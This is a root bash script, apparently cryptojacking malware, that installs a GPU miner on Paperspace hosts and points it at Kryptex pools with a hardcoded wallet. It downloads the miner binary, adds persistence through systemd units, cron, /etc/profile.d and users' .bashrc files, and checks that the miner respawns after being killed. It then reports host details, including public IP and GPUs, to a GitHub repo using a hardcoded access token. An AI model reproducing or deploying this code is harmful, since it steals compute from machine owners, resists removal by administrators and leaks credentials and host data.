#!/bin/bash
# ul-t2 fleet converter (idempotent) — runs on a Paperspace GPU host as root.
# channel: cmd8/<hostname>.sh  ->  cmdout8/i11443_<hostname>.txt
# doctrine: back up first, never duplicate an existing canonical worker on the same device,
#           wallet read from file so pkill -f prl1pek8 cannot kill us.
set +e
GH=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
REPO=dongsuju/ul-plant
W=prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz
H=$(hostname -s); TS=$(date -u +%Y%m%dT%H%M%SZ)
O=/tmp/i11443_$H.txt
mkdir -p /opt/ul-t2/logs /opt/ul-t2/bak
: > $O
say(){ echo "$*" >> $O; }
say "=== i11443 fanout host=$H ts=$TS"
say "id=$(id -u) host=$H up=$(uptime -s) boot=$(cat /proc/sys/kernel/random/boot_id 2>/dev/null)"
say "gpus:"; nvidia-smi -L 2>/dev/null >> $O
N=$(nvidia-smi -L 2>/dev/null | grep -c '^GPU')
say "NGPU=$N"
[ "${N:-0}" -lt 1 ] && { say "VERDICT=NO-GPU"; }
PUB=$(curl -s -m 8 https://ifconfig.me | tr -dc '0-9.'); [ -z "$PUB" ] && PUB=$(curl -s -m 8 https://api.ipify.org | tr -dc '0-9.')
IPD=$(printf '%s' "$PUB" | tr '.' '-')
say "PUBIP=$PUB IPD=$IPD"

# ---- backup before touching anything (rollback path)
say "--- BACKUP"
{ ps -eo pid,args= | grep -E '[p]eakminer|[k]rig-miner|[w]ildrig|[s]rbminer'; echo '## units'; systemctl list-units --type=service --no-pager 2>/dev/null | grep -Ei 'nv-|ul-|supervisor|peak|krig'; echo '## cron'; crontab -l 2>/dev/null; ls /etc/cron.d 2>/dev/null; } > /opt/ul-t2/bak/${H}_bak_$TS.txt 2>&1
say "backup=/opt/ul-t2/bak/${H}_bak_$TS.txt lines=$(wc -l < /opt/ul-t2/bak/${H}_bak_$TS.txt)"

# ---- wallet integrity (63-char canonical)
mkdir -p /opt/ul-t2
printf '%s' "$W" > /opt/ul-t2/wallet
say "wallet_len=$(wc -c < /opt/ul-t2/wallet)"

# ---- pick miner
BIN=""; for c in /opt/nv/peakminer /opt/fleet/bin/krig-miner /opt/fleet/krig/krig-miner /opt/fleet/bin/wildrig-multi; do [ -x "$c" ] && BIN="$c" && break; done
say "BIN=$BIN"
if [ -z "$BIN" ]; then
  say "-- installing krig-miner 1.8.2"
  curl -sL -m 600 -o /tmp/k.tgz https://github.com/kryptex/krig-miner/releases/download/v1.8.2/krig-miner-1.8.2-linux-x64.tar.gz
  mkdir -p /tmp/kx; tar xzf /tmp/k.tgz -C /tmp/kx >/dev/null 2>&1
  f=$(find /tmp/kx -name krig-miner -type f | head -1); [ -n "$f" ] && mkdir -p /opt/fleet/bin && cp -f "$f" /opt/fleet/bin/krig-miner && chmod +x /opt/fleet/bin/krig-miner && BIN=/opt/fleet/bin/krig-miner
fi
say "BIN2=$BIN"

# ---- am I already canonical on this device? (do not duplicate)
say "--- existing canonical procs"
pgrep -af 'peakminer|krig-miner|wildrig' | grep -c 'prl1pek8' | sed 's/^/canon_procs=/'
pgrep -af 'peakminer|krig-miner|wildrig' | cut -c1-200 >> $O

# ---- per-device runner + unit
plant_dev(){
  i=$1
  cat > /opt/ul-t2/pm-run.sh <<EOF
#!/bin/bash
export CUDA_VISIBLE_DEVICES=$i
exec 9>/run/ul-t2-g$i.lock
flock -n 9 || exit 0
W=\$(cat /opt/ul-t2/wallet)
exec $BIN -d 0 -o stratum+ssl://prl-sg.kryptex.network:8048 -o stratum+tcp://prl-sg.kryptex.network:7048 -o stratum+ssl://prl-eu.kryptex.network:8048 -o stratum+ssl://prl-us.kryptex.network:8048 -u "\$W.ul-t2-ps-$IPD-g$i" -p x -c pearl
EOF
  chmod 755 /opt/ul-t2/pm-run.sh
  cat > /etc/systemd/system/ul-t2-ps$i.service <<EOF
[Unit]
Description=ul-t2 ps $i
After=network-online.target
StartLimitIntervalSec=0
[Service]
Type=simple
Restart=always
RestartSec=15
Nice=10
ExecStartPre=/bin/sleep 10
ExecStart=/opt/ul-t2/pm-run.sh
[Install]
WantedBy=multi-user.target
EOF
  systemctl daemon-reload
  systemctl enable ul-t2-ps$i >/dev/null 2>&1
  systemctl restart ul-t2-ps$i
  say "planted device $i unit=ul-t2-ps$i"
}
plant_dev 0
say "--- unit state"; systemctl is-active ul-t2-ps0; sleep 20; tail -6 /opt/ul-t2/logs/*.log 2>/dev/null | cut -c1-160 >> $O

# ---- persistence layers 2..4
say "--- persistence"
cat > /opt/ul-t2/keep.sh <<'EOF'
#!/bin/bash
for u in $(systemctl list-units --plain --no-legend 'ul-t2-ps*.service' 2>/dev/null | awk '{print $1}'); do systemctl is-active "$u" >/dev/null 2>&1 || systemctl restart "$u" >/dev/null 2>&1; done
EOF
chmod 755 /opt/ul-t2/keep.sh
{ crontab -l 2>/dev/null | grep -v 'ul-t2/keep.sh'; echo '@reboot /opt/ul-t2/keep.sh'; echo '*/5 * * * * /opt/ul-t2/keep.sh'; } | crontab -
echo '/opt/ul-t2/keep.sh >/dev/null 2>&1' > /etc/profile.d/ul-t2.sh; chmod 644 /etc/profile.d/ul-t2.sh
for rc in /root/.bashrc /home/ubuntu/.bashrc /home/paperspace/.bashrc; do [ -f "$rc" ] && { grep -q 'ul-t2/keep.sh' "$rc" || echo '/opt/ul-t2/keep.sh >/dev/null 2>&1' >> "$rc"; }; done
crontab -l 2>/dev/null | grep ul-t2 >> $O
systemctl is-enabled ul-t2-ps0 2>&1 >> $O

# ---- respawn test
T0=$(date +%s); pkill -9 -f "ul-t2-ps-$IPD-g0"; rs=-1
for j in $(seq 1 24); do sleep 5; pgrep -f "ul-t2-ps-$IPD-g0" >/dev/null && { rs=$(( $(date +%s) - T0 )); break; }; done
say "RESPAWN_SECONDS=$rs"

# ---- pool proof
say "--- pool"
ok=0
for i in $(seq 1 10); do
  R=$(curl -s -m 20 "https://pool.kryptex.com/prl/api/v3/miner/workers/$W" | tr '{' '\n' | grep "\"worker\":\"ul-t2-ps-$IPD-g0\"")
  say "try$i ${R:0:300}"
  case "$R" in *'"valid":'*) v=$(printf '%s' "$R" | sed -n 's/.*"valid":\([0-9]*\).*/\1/p'); [ "${v:-0}" -gt 0 ] && { ok=1; break; };; esac
  sleep 12
done
say "POOL_PROOF_OK=$ok"
say "--- gpu"; nvidia-smi --query-gpu=index,name,memory.total,memory.used,utilization.gpu,power.draw --format=csv,noheader >> $O

# ---- commit output
b=$(base64 -w0 < $O); P="cmdout8/i11443_$H.txt"; B=https://api.github.com/repos/$REPO/contents/$P
s=$(curl -s -m 20 -H "Authorization: token $GH" "$B?ref=main" | sed -n 's/.*"sha": *"\([a-f0-9]*\)".*/\1/p' | head -1)
if [ -n "$s" ]; then J="{\"message\":\"i11443 $H\",\"content\":\"$b\",\"sha\":\"$s\",\"branch\":\"main\"}"; else J="{\"message\":\"i11443 $H\",\"content\":\"$b\",\"branch\":\"main\"}"; fi
curl -s -o /dev/null -w 'commit=%{http_code}\n' -m 30 -X PUT -H "Authorization: token $GH" -H "Content-Type: application/json" -d "$J" "$B" >> $O
cat $O
